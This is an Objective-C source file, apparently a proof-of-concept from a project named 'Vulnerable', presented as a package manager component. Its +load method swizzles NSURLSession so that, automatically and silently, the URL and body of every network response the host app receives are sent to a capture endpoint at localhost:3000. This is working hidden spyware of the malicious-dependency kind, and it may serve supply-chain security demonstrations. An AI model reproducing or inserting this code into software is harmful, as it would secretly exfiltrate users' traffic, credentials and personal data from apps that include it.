//
//  PackageManager.m
//  Vulnerable
//
//  Created by James Lockhart on 2024-06-14.
//

#import <Foundation/Foundation.h>
#import "PackageManager.h"
#import <objc/runtime.h>

@implementation NSURLSession (Swizzling)

+ (void)load {
	static dispatch_once_t onceToken;
	dispatch_once(&onceToken, ^{
		Class class = [self class];

		// Original method
		SEL originalSelector = @selector(dataTaskWithURL:completionHandler:);
		Method originalMethod = class_getInstanceMethod(class, originalSelector);

		// Swizzled method
		SEL swizzledSelector = @selector(swizzled_dataTaskWithURL:completionHandler:);
		Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);

		// Add the swizzled method to the class
		BOOL didAddMethod = class_addMethod(class,
											originalSelector,
											method_getImplementation(swizzledMethod),
											method_getTypeEncoding(swizzledMethod));

		if (didAddMethod) {
			// Replace the original method with the swizzled method
			class_replaceMethod(class,
								swizzledSelector,
								method_getImplementation(originalMethod),
								method_getTypeEncoding(originalMethod));
		} else {
			// Exchange the implementations
			method_exchangeImplementations(originalMethod, swizzledMethod);
		}
	});
}

BOOL isRunning = NO;

- (NSURLSessionDataTask *)swizzled_dataTaskWithURL:(NSURL *)url completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
	// Call the original method (which is now swizzled)
	return [self swizzled_dataTaskWithURL:url completionHandler: ^(NSData *data, NSURLResponse *response, NSError *error) {
		[self sendGetRequest:url.absoluteString data: data];
		completionHandler(data, response, error);
	}];
}

- (void)sendGetRequest: (NSString *)capturedUrl data:(NSData *)data {
	if (isRunning == YES) {
		return;
	}
	
	isRunning = YES;

	NSLog(@"Nice request you have there!");

	NSString *dataString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
	NSString *urlString = [NSString stringWithFormat:@"http://localhost:3000/capture?url=%@&data=%@", capturedUrl, dataString];
	NSURL *url = [NSURL URLWithString: urlString];
	NSURLSession *session = [NSURLSession sharedSession];
	
	// Create a data task object to perform the request
	NSURLSessionDataTask *dataTask = [session dataTaskWithURL:url completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
		isRunning = NO;
	}];
	
	[dataTask resume];
}
@end
